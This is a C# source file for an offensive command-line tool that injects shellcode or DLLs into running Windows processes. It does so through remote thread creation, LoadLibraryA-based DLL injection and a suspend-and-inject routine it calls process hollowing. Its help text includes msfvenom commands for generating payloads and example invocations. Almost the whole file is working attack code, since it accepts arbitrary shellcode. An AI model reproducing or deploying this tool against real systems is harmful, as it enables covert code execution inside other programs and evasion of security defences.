using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        #region DLL Injection
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        #endregion DLL Injection

        #region Process Hollowing
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
        #endregion Process Hollowing

        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        // https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
        public enum MemOpenThreadAccess
        {

            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_VM_READ = 0x0010,
            SUSPEND_RESUME = 0x0002,
        }


        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static byte[] convertfromc(string val)
        {
            string rval = val.Replace("\"", string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
            string[] sval = rval.Split('\\');

            var fval = string.Empty;
            foreach (var lval in sval)
            {
                if (lval != null)
                {
                    fval += lval;
                }
            }

            return StringToByteArray(fval);
        }

        public static void CodeInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                Console.WriteLine($"[+] Allocating memory to inject the shellcode.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Shellcode written in the process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the shellcode into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }


        public static void DLLInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                Console.WriteLine($"[+] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
                Console.WriteLine($"[+] Allocating memory for the DLL path.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the DLL path at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] DLL path written in the target process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the DLL.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the DLL into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }

        public static void ProcHollowing(string proc, byte[] buf)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = proc;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process holproc = new Process();
                holproc.StartInfo = startInfo;
                holproc.Start();
                Console.WriteLine($"[+] Process {proc} started in background.");

                // https://stackoverflow.com/questions/71257/suspend-process-in-c-sharp
                foreach (ProcessThread thread in holproc.Threads)
                {
                    IntPtr OpenProc;
                    OpenProc = OpenThread((uint)MemOpenThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
                    if (OpenProc == null)
                    {
                        break;
                    }
                    SuspendThread(OpenProc);
                }
                Console.WriteLine($"[+] Process {proc} has been Suspended.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)holproc.Id);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process {proc}.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting shellcode is allocated at 0x{rMemAddress}.");
                uint lpNumberOfBytesWritten = 0;
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
                    uint threadId = 0;
                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, new IntPtr(0), new uint(), rMemAddress, new IntPtr(0), new uint(), ref threadId);

                    foreach (ProcessThread thread in holproc.Threads)
                    {
                        IntPtr OpenProc;
                        OpenProc = OpenThread((uint)MemOpenThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
                        if (OpenProc == null)
                        {
                            break;
                        }
                        ResumeThread(OpenProc);
                    }
                    Console.WriteLine($"[+] Process has been resumed.");
                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process {proc}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the shellcode into the memory of the process {proc}.");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }

        public static void logo()
        {
            Console.WriteLine();
            Console.WriteLine("################################################################################################");
            Console.WriteLine("#  ____  ____   ___   ____ _____ ____ ____    ___ _   _     _ _____ ____ _____ ___ ___  _   _  #");
            Console.WriteLine("# |  _ \\|  _ \\ / _ \\ / ___| ____/ ___/ ___|  |_ _| \\ | |   | | ____/ ___|_   _|_ _/ _ \\| \\ | | #");
            Console.WriteLine("# | |_) | |_) | | | | |   |  _| \\___ \\___ \\   | ||  \\| |_  | |  _|| |     | |  | | | | |  \\| | #");
            Console.WriteLine("# |  __/|  _ <| |_| | |___| |___ ___) |__) |  | || |\\  | |_| | |__| |___  | |  | | |_| | |\\  | #");
            Console.WriteLine("# |_|   |_| \\_\\\\___/ \\____|_____|____/____/  |___|_| \\_|\\___/|_____\\____| |_| |___\\___/|_| \\_| #");
            Console.WriteLine("#                                                                                              #");
            Console.WriteLine("################################################################################################");
            Console.WriteLine();

        }

        public static void help()
        {

            string help = @"
*****************Help*****************
[+] The program is designed to perform process injection.
[+] Currently the tool supports 3 process injection techniques.
    1) Vanila Process Injection
    2) DLL Injection
    3) Process Hollowing

[+] Vanila Process Injection and Process Hollowing
[+] Currently the program accepts shellcode in 3 formats 
    1) base64
    2) hex
    3) C

[+] Generating shellcode in base64 format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64 /t:1

[+] Generating shellcode in hex format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex /t:1

[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:1

[+] DLL Injection
[+] Generating DLL and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2

[+] Process Hollowing
[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3

";
            Console.WriteLine(help);
        }
        static void Main(string[] args)
        {
            try
            {
                logo();
                // https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L10

                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
                }
                else
                {
                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
                }

                if (arguments.Count == 0)
                {
                    Console.WriteLine("[+] No arguments specified. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count < 3)
                {
                    Console.WriteLine("[+] Some arguments are missing. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count >= 3)
                {
                    int procid = 0;
                    if (arguments.ContainsKey("/pid"))
                    {
                        procid = Convert.ToInt32(arguments["/pid"]);
                        Process process = Process.GetProcessById(procid);
                    }
                    if (System.IO.File.Exists(arguments["/path"]) && System.IO.File.Exists(arguments["/ppath"]))
                    {
                        if (arguments["/t"] == "1")
                        {
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            CodeInject(procid, buf);
                        }
                        else if (arguments["/t"] == "2")
                        {
                            var dllpath = arguments["/path"];
                            byte[] buf = Encoding.Default.GetBytes(dllpath);
                            DLLInject(procid, buf);
                        }
                        else if (arguments["/t"] == "3")
                        {
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            ProcHollowing(arguments["/ppath"], buf);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] File doesn't exists. Please check the specified file path.");
                    }
                }
                else
                {
                    Console.WriteLine("[+] Invalid argument. Please refer the help section for more details.");
                    help();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
